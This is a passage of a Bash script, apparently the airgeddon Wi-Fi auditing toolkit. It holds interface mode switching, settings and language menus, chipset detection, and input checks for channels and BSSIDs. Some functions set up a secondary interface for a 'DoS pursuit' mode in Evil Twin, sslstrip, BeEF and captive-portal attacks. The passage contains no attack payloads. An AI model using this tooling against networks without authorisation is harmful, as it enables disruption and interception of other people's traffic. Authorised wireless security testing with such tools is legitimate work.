				secondary_wifi_interface="${new_secondary_interface}"
				current_iface_on_messages="${secondary_wifi_interface}"
				echo
				language_strings "${language}" 21 "yellow"
			fi
		fi
	fi

	echo
	language_strings "${language}" 22 "yellow"
	language_strings "${language}" 115 "read"
	return 0
}

#Set the interface on monitor/managed mode without airmon
function set_mode_without_airmon() {

	debug_print

	local error
	local mode

	ip link set "${1}" down > /dev/null 2>&1

	if [ "${2}" = "monitor" ]; then
		mode="monitor"
		iw "${1}" set monitor control > /dev/null 2>&1
	else
		mode="managed"
		iw "${1}" set type managed > /dev/null 2>&1
	fi

	error=$?
	ip link set "${1}" up > /dev/null 2>&1

	if [ "${error}" != 0 ]; then
		return 1
	fi
	return 0
}

#Check the interface mode
function check_interface_mode() {

	debug_print

	current_iface_on_messages="${1}"
	if ! check_interface_wifi "${1}"; then
		ifacemode="(Non wifi card)"
		return 0
	fi

	modemanaged=$(iw "${1}" info 2> /dev/null | grep type | awk '{print $2}')

	if [[ ${modemanaged^} = "Managed" ]]; then
		ifacemode="Managed"
		return 0
	fi

	modemonitor=$(iw "${1}" info 2> /dev/null | grep type | awk '{print $2}')

	if [[ ${modemonitor^} = "Monitor" ]]; then
		ifacemode="Monitor"
		return 0
	fi

	language_strings "${language}" 23 "red"
	language_strings "${language}" 115 "read"
	exit_code=1
	exit_script_option
}

#Option menu
function option_menu() {

	debug_print

	clear
	language_strings "${language}" 443 "title"
	current_menu="option_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	print_simple_separator
	language_strings "${language}" 78
	print_simple_separator
	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
		language_strings "${language}" 455
	else
		language_strings "${language}" 449
	fi
	if "${AIRGEDDON_SKIP_INTRO:-true}"; then
		language_strings "${language}" 565
	else
		language_strings "${language}" 566
	fi
	if "${AIRGEDDON_BASIC_COLORS:-true}"; then
		language_strings "${language}" 557
	else
		language_strings "${language}" 556
	fi
	if "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
		language_strings "${language}" 456
	else
		language_strings "${language}" 450
	fi
	if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
		language_strings "${language}" 468
	else
		language_strings "${language}" 467
	fi
	if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
		language_strings "${language}" 573
	else
		language_strings "${language}" 574
	fi
	if "${AIRGEDDON_PRINT_HINTS:-true}"; then
		language_strings "${language}" 584
	else
		language_strings "${language}" 585
	fi
	if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
		language_strings "${language}" 592
	else
		language_strings "${language}" 593
	fi
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		language_strings "${language}" 616
	else
		language_strings "${language}" 617
	fi
	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		language_strings "${language}" 638
	else
		language_strings "${language}" 637
	fi
	if "${AIRGEDDON_PLUGINS_ENABLED:-true}"; then
		language_strings "${language}" 651
	else
		language_strings "${language}" 652
	fi
	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
		language_strings "${language}" 688
	else
		language_strings "${language}" 689
	fi
	language_strings "${language}" 447
	print_hint ${current_menu}

	read -rp "> " option_selected
	case ${option_selected} in
		0)
			return
		;;
		1)
			language_menu
		;;
		2)
			if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
				ask_yesno 457 "no"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_AUTO_UPDATE"; then
						echo
						language_strings "${language}" 461 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				language_strings "${language}" 459 "yellow"
				ask_yesno 458 "no"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_AUTO_UPDATE"; then
						echo
						language_strings "${language}" 460 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		3)
			if "${AIRGEDDON_SKIP_INTRO:-true}"; then
				ask_yesno 569 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_SKIP_INTRO"; then
						echo
						language_strings "${language}" 571 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 570 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_SKIP_INTRO"; then
						echo
						language_strings "${language}" 572 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		4)
			if "${AIRGEDDON_BASIC_COLORS:-true}"; then
				ask_yesno 558 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_BASIC_COLORS"; then
						echo
						language_strings "${language}" 560 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 559 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_BASIC_COLORS"; then
						echo
						language_strings "${language}" 561 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		5)
			if ! hash ccze 2> /dev/null; then
				echo
				language_strings "${language}" 464 "yellow"
			fi

			if "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
				ask_yesno 462 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_EXTENDED_COLORS"; then
						echo
						language_strings "${language}" 466 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 463 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_EXTENDED_COLORS"; then
						echo
						language_strings "${language}" 465 "blue"
						if ! "${AIRGEDDON_BASIC_COLORS:-true}"; then
							echo
							language_strings "${language}" 562 "yellow"
						fi
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		6)
			if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
				ask_yesno 469 "no"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_AUTO_CHANGE_LANGUAGE"; then
						echo
						language_strings "${language}" 473 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 471 "yellow"
				ask_yesno 470 "no"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_AUTO_CHANGE_LANGUAGE"; then
						echo
						language_strings "${language}" 472 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
				ask_yesno 577 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_SILENT_CHECKS"; then
						echo
						language_strings "${language}" 579 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 578 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_SILENT_CHECKS"; then
						echo
						language_strings "${language}" 580 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			if "${AIRGEDDON_PRINT_HINTS:-true}"; then
				ask_yesno 586 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_PRINT_HINTS"; then
						echo
						language_strings "${language}" 588 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 587 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_PRINT_HINTS"; then
						echo
						language_strings "${language}" 589 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		9)
			if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
				ask_yesno 596 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_5GHZ_ENABLED"; then
						echo
						language_strings "${language}" 598 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 597 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_5GHZ_ENABLED"; then
						echo
						language_strings "${language}" 599 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		10)
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
				ask_yesno 657 "yes"
				if [ "${yesno}" = "y" ]; then
					sed -ri "s:(AIRGEDDON_WINDOWS_HANDLING)=(xterm):\1=tmux:" "${rc_path}" 2> /dev/null
					echo
					language_strings "${language}" 620 "yellow"
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 658 "yes"
				if [ "${yesno}" = "y" ]; then
					sed -ri "s:(AIRGEDDON_WINDOWS_HANDLING)=(tmux):\1=xterm:" "${rc_path}" 2> /dev/null
					echo
					language_strings "${language}" 620 "yellow"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		11)
			ask_yesno 639 "yes"
			if [ "${yesno}" = "y" ]; then
				mdk_version_toggle

				echo
				language_strings "${language}" 640 "yellow"
				language_strings "${language}" 115 "read"
			fi
		;;
		12)
			if "${AIRGEDDON_PLUGINS_ENABLED:-true}"; then
				ask_yesno 655 "yes"
			else
				ask_yesno 656 "yes"
			fi

			if [ "${yesno}" = "y" ]; then
				if option_toggle "AIRGEDDON_PLUGINS_ENABLED" "required_reboot"; then
					echo
					language_strings "${language}" 620 "yellow"
				else
					echo
					language_strings "${language}" 417 "red"
				fi
				language_strings "${language}" 115 "read"
			fi
		;;
		13)
			if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
				ask_yesno 692 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING"; then
						echo
						language_strings "${language}" 694 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 693 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING"; then
						echo
						language_strings "${language}" 695 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		14)
			ask_yesno 478 "yes"
			if [ "${yesno}" = "y" ]; then
				get_current_permanent_language
				if [ "${language}" = "${current_permanent_language}" ]; then
					echo
					language_strings "${language}" 480 "red"
				else
					if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
						echo
						language_strings "${language}" 479 "yellow"
						option_toggle "AIRGEDDON_AUTO_CHANGE_LANGUAGE"
					fi

					if set_permanent_language; then
						echo
						language_strings "${language}" 481 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
				fi
				language_strings "${language}" 115 "read"
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	option_menu
}

#Language change menu
function language_menu() {

	debug_print

	clear
	language_strings "${language}" 87 "title"
	current_menu="language_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 81 "green"
	print_simple_separator
	language_strings "${language}" 446
	print_simple_separator
	language_strings "${language}" 79
	language_strings "${language}" 80
	language_strings "${language}" 113
	language_strings "${language}" 116
	language_strings "${language}" 249
	language_strings "${language}" 308
	language_strings "${language}" 320
	language_strings "${language}" 482
	language_strings "${language}" 58
	language_strings "${language}" 331
	language_strings "${language}" 519
	language_strings "${language}" 687
	language_strings "${language}" 717
	print_hint ${current_menu}

	read -rp "> " language_selected
	echo
	case ${language_selected} in
		0)
			return
		;;
		1)
			if [ "${language}" = "ENGLISH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="ENGLISH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		2)
			if [ "${language}" = "SPANISH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="SPANISH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		3)
			if [ "${language}" = "FRENCH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="FRENCH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		4)
			if [ "${language}" = "CATALAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="CATALAN"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		5)
			if [ "${language}" = "PORTUGUESE" ]; then
				language_strings "${language}" 251 "red"
			else
				language="PORTUGUESE"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		6)
			if [ "${language}" = "RUSSIAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="RUSSIAN"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		7)
			if [ "${language}" = "GREEK" ]; then
				language_strings "${language}" 251 "red"
			else
				language="GREEK"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		8)
			if [ "${language}" = "ITALIAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="ITALIAN"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		9)
			if [ "${language}" = "POLISH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="POLISH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		10)
			if [ "${language}" = "GERMAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="GERMAN"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		11)
			if [ "${language}" = "TURKISH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="TURKISH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		12)
			if [ "${language}" = "ARABIC" ]; then
				language_strings "${language}" 251 "red"
			else
				language="ARABIC"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		13)
			if [ "${language}" = "CHINESE" ]; then
				language_strings "${language}" 251 "red"
			else
				language="CHINESE"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		*)
			invalid_language_selected
		;;
	esac

	detect_rtl_language
	initialize_language_strings
	hookable_for_languages

	language_menu
}

#Read the chipset for an interface
function set_chipset() {

	debug_print

	chipset=""
	sedrule1="s/^[0-9a-f]\{1,4\} \|^ //Ig"
	sedrule2="s/ Network Connection.*//Ig"
	sedrule3="s/ Wireless.*//Ig"
	sedrule4="s/ PCI Express.*//Ig"
	sedrule5="s/ \(Gigabit\|Fast\) Ethernet.*//Ig"
	sedrule6="s/ \[.*//"
	sedrule7="s/ (.*//"
	sedrule8="s|802\.11a/b/g/n/ac.*||Ig"

	sedruleall="${sedrule1};${sedrule2};${sedrule3};${sedrule4};${sedrule5};${sedrule6};${sedrule7};${sedrule8}"

	if [ -f "/sys/class/net/${1}/device/modalias" ]; then
		bus_type=$(cut -f 1 -d ":" < "/sys/class/net/${1}/device/modalias")

		if [ "${bus_type}" = "usb" ]; then
			vendor_and_device=$(cut -b 6-14 < "/sys/class/net/${1}/device/modalias" | sed 's/^.//;s/p/:/')
			if hash lsusb 2> /dev/null; then
				if [[ -n "${2}" ]] && [[ "${2}" = "read_only" ]]; then
					requested_chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
				else
					chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
				fi
			fi

		elif [[ "${bus_type}" =~ pci|ssb|bcma|pcmcia ]]; then
			if [[ -f /sys/class/net/${1}/device/vendor ]] && [[ -f /sys/class/net/${1}/device/device ]]; then
		vendor_and_device=$(sed -e 's/0x//' "/sys/class/net/${1}/device/vendor"):$(sed -e 's/0x//' "/sys/class/net/${1}/device/device")
				if [[ -n "${2}" ]] && [[ "${2}" = "read_only" ]]; then
					requested_chipset=$(lspci -d "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
				else
					chipset=$(lspci -d "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
				fi
			else
				if hash ethtool 2> /dev/null; then
					ethtool_output=$(ethtool -i "${1}" 2>&1)
					vendor_and_device=$(printf "%s" "${ethtool_output}" | grep "bus-info" | cut -f 3 -d ":" | sed 's/^ //')
					if [[ -n "${2}" ]] && [[ "${2}" = "read_only" ]]; then
						requested_chipset=$(lspci | grep "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
					else
						chipset=$(lspci | grep "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
					fi
				fi
			fi
		fi
	elif [[ -f /sys/class/net/${1}/device/idVendor ]] && [[ -f /sys/class/net/${1}/device/idProduct ]]; then
		vendor_and_device=$(cat "/sys/class/net/${1}/device/idVendor"):$(cat "/sys/class/net/${1}/device/idProduct")
		if hash lsusb 2> /dev/null; then
			if [[ -n "${2}" ]] && [[ "${2}" = "read_only" ]]; then
				requested_chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
			else
				chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
			fi
		fi
	fi
}

#Manage and validate the prerequisites for DoS Pursuit mode integrated on Evil Twin and Enterprise attacks
function dos_pursuit_mode_et_handler() {

	debug_print

	ask_yesno 505 "no"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1

		if [ "${et_dos_attack}" = "Auth DoS" ]; then
			echo
			language_strings "${language}" 508 "yellow"
			language_strings "${language}" 115 "read"
		fi

		if select_secondary_interface "dos_pursuit_mode"; then

			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"

				if [ -n "${enterprise_mode}" ]; then
					return_to_enterprise_main_menu=1
				else
					return_to_et_main_menu=1
				fi
				return 1
			fi

			if ! check_monitor_enabled "${secondary_wifi_interface}"; then
				echo
				language_strings "${language}" 14 "yellow"
				echo
				language_strings "${language}" 513 "blue"
				language_strings "${language}" 115 "read"
				echo
				if ! monitor_option "${secondary_wifi_interface}"; then
					if [ -n "${enterprise_mode}" ]; then
						return_to_enterprise_main_menu=1
					else
						return_to_et_main_menu=1
					fi
					return 1
				else
					echo
					language_strings "${language}" 34 "yellow"
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 34 "yellow"
				language_strings "${language}" 115 "read"
			fi
		else
			return 1
		fi
	fi

	return 0
}

#Secondary interface selection menu for Evil Twin, Enterprise attacks and DoS pursuit mode
function select_secondary_interface() {

	debug_print

	if [ "${return_to_et_main_menu}" -eq 1 ]; then
		return 1
	fi

	if [ "${return_to_enterprise_main_menu}" -eq 1 ]; then
		return 1
	fi

	clear
	if [ -n "${enterprise_mode}" ]; then
		current_menu="enterprise_attacks_menu"
		case ${enterprise_mode} in
			"smooth")
				language_strings "${language}" 522 "title"
			;;
			"noisy")
				language_strings "${language}" 523 "title"
			;;
		esac
	elif [[ -z "${enterprise_mode}" ]] && [[ -z "${et_mode}" ]]; then
		current_menu="dos_attacks_menu"
	elif [[ -z "${enterprise_mode}" ]] && [[ -n "${et_mode}" ]]; then
		current_menu="evil_twin_attacks_menu"
		case ${et_mode} in
			"et_onlyap")
				language_strings "${language}" 270 "title"
			;;
			"et_sniffing")
				language_strings "${language}" 291 "title"
			;;
			"et_sniffing_sslstrip2")
				language_strings "${language}" 292 "title"
			;;
			"et_sniffing_sslstrip2_beef")
				language_strings "${language}" 397 "title"
			;;
			"et_captive_portal")
				language_strings "${language}" 293 "title"
			;;
		esac
	fi

	if [ "${1}" = "dos_pursuit_mode" ]; then
		readarray -t secondary_ifaces < <(iw dev | grep "Interface" | awk '{print $2}' | grep "${interface}" -v)
	elif [ "${1}" = "internet" ]; then
		if [ -n "${secondary_wifi_interface}" ]; then
			readarray -t secondary_ifaces < <(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v | grep "${interface}" -v | grep "${secondary_wifi_interface}" -v)
		else
			readarray -t secondary_ifaces < <(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v | grep "${interface}" -v)
		fi
	fi

	if [ ${#secondary_ifaces[@]} -eq 1 ]; then
		if [ "${1}" = "dos_pursuit_mode" ]; then
			secondary_wifi_interface="${secondary_ifaces[0]}"
			secondary_phy_interface=$(physical_interface_finder "${secondary_wifi_interface}")
			check_interface_supported_bands "${secondary_phy_interface}" "secondary_wifi_interface"
		elif [ "${1}" = "internet" ]; then
			internet_interface="${secondary_ifaces[0]}"
		fi

		echo
		language_strings "${language}" 662 "yellow"
		language_strings "${language}" 115 "read"
		return 0
	fi

	option_counter=0
	for item in "${secondary_ifaces[@]}"; do
		if [ "${option_counter}" -eq 0 ]; then
			if [ "${1}" = "dos_pursuit_mode" ]; then
				echo
				language_strings "${language}" 511 "green"
			elif [ "${1}" = "internet" ]; then
				echo
				language_strings "${language}" 279 "green"
			fi
			print_simple_separator
			if [ -n "${enterprise_mode}" ]; then
				language_strings "${language}" 521
			else
				language_strings "${language}" 266
			fi
			print_simple_separator
		fi

		option_counter=$((option_counter + 1))
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface=" "
		fi
		set_chipset "${item}"
		echo -ne "${option_counter}.${spaceiface}${item} "
		if [ -z "${chipset}" ]; then
			language_strings "${language}" 245 "blue"
		else
			if [ "${is_rtl_language}" -eq 1 ]; then
				echo -e "${blue_color}// ${normal_color}${chipset} ${yellow_color}:Chipset${normal_color}"
			else
				echo -e "${blue_color}// ${yellow_color}Chipset:${normal_color} ${chipset}"
			fi
		fi
	done

	if [ "${option_counter}" -eq 0 ]; then
		if [ -n "${enterprise_mode}" ]; then
			return_to_enterprise_main_menu=1
		elif [[ -z "${enterprise_mode}" ]] && [[ -n "${et_mode}" ]]; then
			return_to_et_main_menu=1
			return_to_et_main_menu_from_beef=1
		fi

		echo
		if [ "${1}" = "dos_pursuit_mode" ]; then
			language_strings "${language}" 510 "red"
		elif [ "${1}" = "internet" ]; then
			language_strings "${language}" 280 "red"
		fi
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [ ${option_counter: -1} -eq 9 ]; then
		spaceiface+=" "
	fi
	print_hint ${current_menu}

	read -rp "> " secondary_iface
	if [ "${secondary_iface}" -eq 0 ] 2> /dev/null; then
		if [ -n "${enterprise_mode}" ]; then
			return_to_enterprise_main_menu=1
		elif [[ -z "${enterprise_mode}" ]] && [[ -n "${et_mode}" ]]; then
			return_to_et_main_menu=1
			return_to_et_main_menu_from_beef=1
		fi
		return 1
	elif [[ ! ${secondary_iface} =~ ^[[:digit:]]+$ ]] || ((secondary_iface < 1 || secondary_iface > option_counter)); then
		if [ "${1}" = "dos_pursuit_mode" ]; then
			invalid_secondary_iface_selected "dos_pursuit_mode"
		else
			invalid_secondary_iface_selected "internet"
		fi
	else
		option_counter2=0
		for item2 in "${secondary_ifaces[@]}"; do
			option_counter2=$((option_counter2 + 1))
			if [ "${secondary_iface}" = "${option_counter2}" ]; then
				if [ "${1}" = "dos_pursuit_mode" ]; then
					secondary_wifi_interface=${item2}
					secondary_phy_interface=$(physical_interface_finder "${secondary_wifi_interface}")
					check_interface_supported_bands "${secondary_phy_interface}" "secondary_wifi_interface"
				elif [ "${1}" = "internet" ]; then
					internet_interface=${item2}
				fi
				break
			fi
		done
		return 0
	fi
}

#Interface selection menu
function select_interface() {

	debug_print

	local interface_menu_band

	clear
	language_strings "${language}" 88 "title"
	current_menu="select_interface_menu"
	language_strings "${language}" 24 "green"
	print_simple_separator
	ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v)
	option_counter=0
	for item in ${ifaces}; do
		option_counter=$((option_counter + 1))
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface=" "
		fi
		echo -ne "${option_counter}.${spaceiface}${item} "
		set_chipset "${item}"
		if [ "${chipset}" = "" ]; then
			language_strings "${language}" 245 "blue"
		else
			interface_menu_band=""
			if check_interface_wifi "${item}"; then
				interface_menu_band+="${blue_color}// ${pink_color}"
				get_5ghz_band_info_from_phy_interface "$(physical_interface_finder "${item}")"
				case "$?" in
					"1")
						interface_menu_band+="${band_24ghz}"
					;;
					*)
						interface_menu_band+="${band_24ghz}, ${band_5ghz}"
					;;
				esac
				get_6ghz_band_info_from_phy_interface "$(physical_interface_finder "${item}")"
				if [ "$?" -ne 1 ]; then
					interface_menu_band+=", ${band_6ghz}"
				fi
			fi

			if [ "${is_rtl_language}" -eq 1 ]; then
				echo -e "${interface_menu_band} ${blue_color}// ${normal_color}${chipset} ${yellow_color}:Chipset${normal_color}"
			else
				echo -e "${interface_menu_band} ${blue_color}// ${yellow_color}Chipset:${normal_color} ${chipset}"
			fi
		fi
	done
	print_hint ${current_menu}

	read -rp "> " iface
	if [[ ! ${iface} =~ ^[[:digit:]]+$ ]] || ((iface < 1 || iface > option_counter)); then
		invalid_iface_selected
	else
		option_counter2=0
		for item2 in ${ifaces}; do
			option_counter2=$((option_counter2 + 1))
			if [ "${iface}" = "${option_counter2}" ]; then
				interface=${item2}
				phy_interface=$(physical_interface_finder "${interface}")
				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
				interface_mac=$(ip link show "${interface}" | awk '/ether/ {print $2}')
				if ! check_vif_support; then
					card_vif_support=0
				else
					card_vif_support=1
				fi
				check_interface_wifi_longname "${interface}"
				break
			fi
		done
	fi
}

#Read the user input on yes/no questions
function read_yesno() {

	debug_print

	echo
	language_strings "${language}" "${1}" "green"
	read -rp "> " yesno
}

#Validate the input on yes/no questions
function ask_yesno() {

	debug_print

	if [ -z "${2}" ]; then
		local regexp="^[YN]$|^YES$|^NO$"
		visual_choice="[y/n]"
	else
		local regexp="^[YN]$|^YES$|^NO$|^$"
		default_choice="${2}"
		if [[ ${default_choice^^} =~ ^[Y]$|^YES$ ]]; then
			default_choice="y"
			visual_choice="[Y/n]"
		else
			default_choice="n"
			visual_choice="[y/N]"
		fi
	fi

	yesno="null"
	while [[ ! ${yesno^^} =~ ${regexp} ]]; do
		read_yesno "${1}"
	done

	case ${yesno^^} in
		"Y"|"YES")
			yesno="y"
		;;
		"N"|"NO")
			yesno="n"
		;;
		"")
			yesno="${default_choice}"
		;;
	esac
}

#Read the user input on channel questions
function read_channel() {

	debug_print

	echo
	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
		language_strings "${language}" 25 "green"
	else
		language_strings "${language}" 517 "green"
	fi

	if [ "${1}" = "wps" ]; then
		read -rp "> " wps_channel
	else
		read -rp "> " channel
	fi
}

#Validate the input on channel questions
function ask_channel() {

	debug_print

	local regexp
	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
		regexp="^${valid_channels_24_ghz_regexp}$"
	else
		regexp="^${valid_channels_24_and_5_ghz_regexp}$"
	fi

	if [ "${1}" = "wps" ]; then
		if [[ -n "${wps_channel}" ]] && [[ "${wps_channel}" -gt 14 ]]; then
			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		fi

		while [[ ! ${wps_channel} =~ ${regexp} ]]; do
			read_channel "wps"
		done
		echo
		language_strings "${language}" 365 "blue"
	else
		if [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]]; then
			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		fi

		while [[ ! ${channel} =~ ${regexp} ]]; do
			read_channel
		done
		echo
		language_strings "${language}" 26 "blue"
	fi

	return 0
}

#Read the user input on asleap challenge
function read_challenge() {

	debug_print

	echo
	language_strings "${language}" 553 "green"
	read -rp "> " enterprise_asleap_challenge
}

#Read the user input on asleap response
function read_response() {

	debug_print

	echo
	language_strings "${language}" 554 "green"
	read -rp "> " enterprise_asleap_response
}

#Read the user input on bssid questions
function read_bssid() {

	debug_print

	echo
	language_strings "${language}" 27 "green"
	if [ "${1}" = "wps" ]; then
		read -rp "> " wps_bssid
	else
		read -rp "> " bssid
	fi
}

#Validate the input on bssid questions
function ask_bssid() {

	debug_print

	local regexp="^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$"

	if [ "${1}" = "wps" ]; then
		if [ -z "${wps_bssid}" ]; then
			ask_yesno 439 "no"
			if [ "${yesno}" = "n" ]; then
				return 1
			fi
		fi

		while [[ ! ${wps_bssid} =~ ${regexp} ]]; do
			read_bssid "wps"
		done
		echo
		language_strings "${language}" 364 "blue"
	else
